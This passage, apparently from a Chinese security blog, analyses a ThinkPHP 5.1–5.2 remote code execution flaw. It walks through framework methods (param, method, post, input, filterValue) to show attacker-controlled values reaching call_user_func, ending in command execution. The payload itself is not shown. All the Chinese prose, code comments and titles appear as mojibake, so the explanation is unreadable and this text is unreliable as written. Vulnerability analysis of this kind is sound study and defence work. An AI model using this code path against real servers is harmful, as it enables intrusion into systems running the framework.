<p>ç”±å›¾å¯è§ï¼Œåœ¨è°ƒç”¨å®Œ<code>routecheck</code>æ–¹æ³•åï¼Œåˆ¤æ–­æ˜¯å¦æœ‰debugï¼Œç„¶åè¿›å…¥ifè¯­å¥ï¼Œè¿™é‡Œæˆ‘ä»¬çš„debugæ˜¯å¼€äº†çš„ï¼Œæ‰€ä»¥å¯ä»¥è¿›å…¥ä¸‹ä¸€å¤„æ¼æ´ç‚¹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;request-&gt;param()</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿›paramæ–¹æ³•ï¼Œä»£ç å¦‚ä¸‹:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;param)) &#123;</span><br><span class="line">        $method = <span class="keyword">$this</span>-&gt;method(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡</span></span><br><span class="line">        <span class="keyword">switch</span> ($method) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'POST'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;post(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PUT'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'DELETE'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PATCH'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;put(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                $vars = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å½“å‰è¯·æ±‚å‚æ•°å’ŒURLåœ°å€ä¸­çš„å‚æ•°åˆå¹¶</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $name) &#123;</span><br><span class="line">        <span class="comment">// è·å–åŒ…å«æ–‡ä»¶ä¸Šä¼ ä¿¡æ¯çš„æ•°ç»„</span></span><br><span class="line">        $file = <span class="keyword">$this</span>-&gt;file();</span><br><span class="line">        $data = is_array($file) ? array_merge(<span class="keyword">$this</span>-&gt;param, $file) : <span class="keyword">$this</span>-&gt;param;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input($data, <span class="string">''</span>, $default, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºæˆ‘ä»¬çš„$this-&gt;paramå¹¶æ²¡æœ‰èµ‹å€¼ï¼Œæ‰€ä»¥ç›´æ¥è¿›å…¥äº†methodæ–¹æ³•ï¼Œä»£ç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">method</span><span class="params">($method = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $method) &#123;</span><br><span class="line">        <span class="comment">// è·å–åŸå§‹è¯·æ±‚ç±»å‹</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isCli() ? <span class="string">'GET'</span> : (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>]) ? <span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>] : $_SERVER[<span class="string">'REQUEST_METHOD'</span>]);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!<span class="keyword">$this</span>-&gt;method) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="keyword">$this</span>-&gt;config-&gt;get(<span class="string">'var_method'</span>)])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;method = strtoupper($_POST[<span class="keyword">$this</span>-&gt;config-&gt;get(<span class="string">'var_method'</span>)]);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;method&#125;($_POST);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_HTTP_METHOD_OVERRIDE'</span>])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;method = strtoupper($_SERVER[<span class="string">'HTTP_X_HTTP_METHOD_OVERRIDE'</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;method = <span class="keyword">$this</span>-&gt;isCli() ? <span class="string">'GET'</span> : (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>]) ? <span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>] : $_SERVER[<span class="string">'REQUEST_METHOD'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;method;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºè¿™é‡Œæˆ‘ä»¬ä¼ å…¥çš„methodæ–¹æ³•çš„å‚æ•°ä¸ºTrueï¼Œæ‰€ä»¥ç›´æ¥è¿›å…¥äº†ç¬¬ä¸€ä¸ªIfç„¶åå°±returnå€¼äº†ï¼Œä¸‹é¢ä¹‹å‰æˆ‘ä»¬ä¹‹å‰åˆ©ç”¨è¿‡çš„æ¼æ´ç‚¹æ˜¯è¿›ä¸å»çš„,ä¹Ÿå°±æ˜¯è¿™ä¸ªmethodæ–¹æ³•å®é™…ä¸Šå°±æ˜¯å»è·å¾—æˆ‘ä»¬çš„è¯·æ±‚ç±»å‹çš„ï¼Œç„¶åå†å›åˆ°paramæ–¹æ³•ï¼Œæ¥ç€å‘ä¸‹èµ°</p>
<p><a href="https://imgchr.com/i/eBWv0f" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/03/eBWv0f.png" alt="eBWv0f.png"></a></p>
<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„methodæ–¹æ³•è·å¾—çš„å€¼ä¸ºpostï¼Œç„¶åé€šè¿‡switchè·Ÿè¿›postæ–¹æ³•ï¼Œè¿™é‡Œè¦æ³¨æ„çœ‹ä¸€ä¸‹æˆ‘ä»¬çš„å‚æ•°æ˜¯falseï¼Œpostæ–¹æ³•ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">post</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;post)) &#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;input;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($_POST) &amp;&amp; <span class="keyword">false</span> !== strpos(<span class="keyword">$this</span>-&gt;contentType(), <span class="string">'application/json'</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;post = (<span class="keyword">array</span>) json_decode($content, <span class="keyword">true</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;post = $_POST;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_array($name)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;param       = [];</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;post = array_merge(<span class="keyword">$this</span>-&gt;post, $name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;post, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘ä»¬æ˜¯ç›´æ¥è¿›å…¥äº†elseæ¡ä»¶ï¼Œç»™æˆ‘ä»¬çš„postå˜é‡èµ‹å€¼äº†æˆ‘ä»¬ä¼ å…¥è¿›å»çš„postæ•°ç»„ï¼Œæ¥ç€è·Ÿè¿›returnçš„inputæ–¹æ³•ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === $name) &#123;</span><br><span class="line">        <span class="comment">// è·å–åŸå§‹æ•°æ®</span></span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $name = (string) $name;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">''</span> != $name) &#123;</span><br><span class="line">        <span class="comment">// è§£æname</span></span><br><span class="line">        <span class="keyword">if</span> (strpos($name, <span class="string">'/'</span>)) &#123;</span><br><span class="line">            <span class="keyword">list</span>($name, $type) = explode(<span class="string">'/'</span>, $name);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $type = <span class="string">'s'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æŒ‰.æ‹†åˆ†æˆå¤šç»´æ•°ç»„è¿›è¡Œåˆ¤æ–­</span></span><br><span class="line">        <span class="keyword">foreach</span> (explode(<span class="string">'.'</span>, $name) <span class="keyword">as</span> $val) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($data[$val])) &#123;</span><br><span class="line">                $data = $data[$val];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// æ— è¾“å…¥æ•°æ®ï¼Œè¿”å›é»˜è®¤å€¼</span></span><br><span class="line">                <span class="keyword">return</span> $default;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_object($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è§£æè¿‡æ»¤å™¨</span></span><br><span class="line">    $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">        array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">        reset($data);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($type) &amp;&amp; $data !== $default) &#123;</span><br><span class="line">        <span class="comment">// å¼ºåˆ¶ç±»å‹è½¬æ¢</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;typeCast($data, $type);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™é‡Œå› ä¸ºæˆ‘ä»¬ä¼ å…¥çš„æ˜¯falseï¼Œæ‰€ä»¥åªèƒ½è¿›å…¥ç¬¬ä¸€æ­¥ifï¼Œè¿”å›äº†æˆ‘ä»¬çš„$this-&gt;postã€‚æ¥ç€å›åˆ°appç±»ï¼Œç»§ç»­è·Ÿè¿›ï¼Œè¿™é‡Œå°†æˆ‘ä»¬çš„$this-&gt;postçš„å€¼èµ‹ç»™äº†æˆ‘ä»¬çš„varså˜é‡ï¼Œä¸‹ä¸€æ­¥ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç»™Requestç±»ä¸­çš„$this-&gt;paramè¿›è¡Œäº†ä¸€æ¬¡èµ‹å€¼ï¼Œè¿›è¡Œäº†æ•°ç»„åˆå¹¶ï¼Œä¸è¿‡getå’Œrouteéƒ½æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥$this-&gt;paramå…¶å®å°±æ˜¯æˆ‘ä»¬çš„postæ•°ç»„ï¼Œæ¥ç€å‘ä¸‹è·Ÿè¿›ï¼Œå†æ¬¡è°ƒç”¨äº†inputæ–¹æ³•ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br></pre></td></tr></table></figure>

<p>ç»§ç»­è·Ÿè¿›inputæ–¹æ³•ï¼Œè¿™æ¬¡æˆ‘ä»¬å¹¶æ²¡æœ‰falseçš„é˜»ç¢ï¼Œå¯ä»¥å‘ä¸‹ç»§ç»­è·Ÿè¿›</p>
<p><img src="https://s2.ax1x.com/2019/08/03/eB4Szj.png" alt="eB4Szj.png"></p>
<p>é¦–å…ˆå‘ç°è¿›å…¥äº†getfilteræ–¹æ³•ï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼Œå…¶å®å°±æ˜¯æŠŠæˆ‘ä»¬çš„$this-&gt;filterèµ‹å€¼ç»™filterã€‚æ‰€ä»¥å¯è§ä¸Šå›¾å˜é‡ä¸­çš„æ•°æ®ã€‚æ¥ç€è·Ÿè¿›<code>array_walk_recursive</code>æ–¹æ³•ï¼Œçœ‹ä¸€ä¸‹æ‰‹å†Œçš„æè¿°</p>
<p><img src="https://s2.ax1x.com/2019/08/03/eB4gpQ.png" alt="eB4gpQ.png"></p>
<p>çœ‹ä¸€ä¸‹ä¾‹å­å°±ä¼šå¾ˆæ˜ç™½äº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">$sweet = <span class="keyword">array</span>(<span class="string">'a'</span> =&gt; <span class="string">'apple'</span>, <span class="string">'b'</span> =&gt; <span class="string">'banana'</span>);</span><br><span class="line">$fruits = <span class="keyword">array</span>(<span class="string">'sweet'</span> =&gt; $sweet, <span class="string">'sour'</span> =&gt; <span class="string">'lemon'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_print</span><span class="params">($item, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$key holds $item\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array_walk_recursive($fruits, <span class="string">'test_print'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè°ƒç”¨çš„æ˜¯filterValueæ–¹æ³•ï¼Œè·Ÿè¿›çœ‹ä¸€ä¸‹</p>
<p><img src="https://s2.ax1x.com/2019/08/03/eB4okT.png" alt="eB4okT.png"></p>
<p>è¿™é‡Œçœ‹åˆ°äº†å…³é”®å‡½æ•°<code>call_user_func</code>ï¼Œè€Œä¸”è¿™ä¸ªå‡½æ•°çš„ä¸¤ä¸ªå‚æ•°æˆ‘ä»¬è¿˜éƒ½å¯ä»¥æ§åˆ¶</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$value----<span class="keyword">$this</span>-&gt;param</span><br><span class="line"></span><br><span class="line">$filter----<span class="keyword">$this</span>-&gt;filter</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆå¯ä»¥ç»è¿‡ä¸æ–­éå†è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ç›®çš„</p>
<p><img src="https://s2.ax1x.com/2019/08/03/eB5SAK.png" alt="eB5SAK.png"></p>
<p>æœ€ç»ˆå¦‚æœ¬æ–‡å¼€å¤´æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ã€‚</p>
<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>æ”»å‡»é“¾å¦‚ä¸‹</p>
<p><img src="https://s2.ax1x.com/2019/08/03/eBItsA.png" alt="eBItsA.png"></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/10/08/Thinkphp-5-1-5-2-RCE%E5%88%86%E6%9E%90/" data-id="ckabsu38o0029kkvrawc95u7z" class="article-share-link" data-share="baidu" data-title="Thinkphp 5.1-5.2 RCEåˆ†æ">Share</a>
      

      
        <a href="http://yoursite.com/2019/10/08/Thinkphp-5-1-5-2-RCE%E5%88%86%E6%9E%90/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Webå®‰å…¨</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
  </nav>
</section>
      
      <aside id="sidebar">
  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">30</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB%E5%AE%89%E5%85%A8/" rel="tag">WEBå®‰å…¨</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Webå®‰å…¨</a><span class="tag-list-count">26</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/" rel="tag">ç”Ÿæ´»éšç¬”</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">éšç¬”</a><span class="tag-list-count">1</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 12.5px;">Crypto</a> <a href="/tags/WEB%E5%AE%89%E5%85%A8/" style="font-size: 10px;">WEBå®‰å…¨</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 17.5px;">Webå®‰å…¨</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">ç”Ÿæ´»éšç¬”</a> <a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">éšç¬”</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a><span class="archive-list-count">21</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/05/13/Apache-Common-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/">Apache Common Collections ååºåˆ—åŒ–åˆ†æå­¦ä¹ </a>
          </li>
        
          <li>
            <a href="/2020/05/12/intigriti-Easter-XSS-challenge/">intigriti Easter XSS challenge</a>
          </li>
        
          <li>
            <a href="/2020/04/22/VolgaCTF-2020-Qualifier-Web/">VolgaCTF 2020 Qualifier-Web</a>
          </li>
        
          <li>
            <a href="/2020/04/15/DOM-Clobbering-Attack/">DOM Clobbering Attack</a>
          </li>
        
          <li>
            <a href="/2020/04/09/Javascript%E4%B8%AD%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E%E5%B8%A6%E6%9D%A5%E7%9A%84Tags-Broken/">Javascriptä¸­å˜é‡å£°æ˜å¸¦æ¥çš„Tags Broken</a>
          </li>
        
      </ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Links</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="http://arvinxiang.com" target="_blank">ä¸»é¢˜ä½œè€…</a>
          </li>
        
          <li>
            <a href="http://reqianduan.com" target="_blank">çƒ­å‰ç«¯</a>
          </li>
        
          <li>
            <a href="http://yuancheng.work" target="_blank">è¿œç¨‹.work</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
      
    </div>
    <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 ç¦»æ€€ç§‹<br>
      Powered by <a href="//hexo.io/" target="_blank">Hexo</a>
      .
      Theme by <a href="https://github.com/xiangming/landscape-plus" target="_blank">Landscape-plus</a>
    </div>
  </div>
</footer>
  </div>
  <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
  <!-- totop start -->
<div id="totop">
<a title="totop"><img src="/img/scrollup.png"/></a>
</div>

<!-- totop end -->

<!-- å¤šè¯´å…¬å…±jsä»£ç  start -->
<script type="text/javascript">
var duoshuoQuery = {short_name:"reqianduan"};
  (function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0]
     || document.getElementsByTagName('body')[0]).appendChild(ds);
  })();
  </script>
<!-- å¤šè¯´å…¬å…±jsä»£ç  end -->


<!-- ç™¾åº¦åˆ†äº« start -->

<div id="article-share-box" class="article-share-box">
  <div id="bdshare" class="bdsharebuttonbox article-share-links">
    <a class="article-share-weibo" data-cmd="tsina" title="åˆ†äº«åˆ°æ–°æµªå¾®åš"></a>
    <a class="article-share-weixin" data-cmd="weixin" title="åˆ†äº«åˆ°å¾®ä¿¡"></a>
    <a class="article-share-qq" data-cmd="sqq" title="åˆ†äº«åˆ°QQ"></a>
    <a class="article-share-renren" data-cmd="renren" title="åˆ†äº«åˆ°äººäººç½‘"></a>
    <a class="article-share-more" data-cmd="more" title="æ›´å¤š"></a>
  </div>
</div>
<script>
  function SetShareData(cmd, config) {
    if (shareDataTitle && shareDataUrl) {
      config.bdText = shareDataTitle;
      config.bdUrl = shareDataUrl;
    }
    return config;
  }
  window._bd_share_config={
    "common":{onBeforeClick: SetShareData},
    "share":{"bdCustomStyle":"/css/bdshare.css"}
  };
  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
</script>

<!-- ç™¾åº¦åˆ†äº« end -->

<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>





<script src="/js/script.js"></script>


</div>
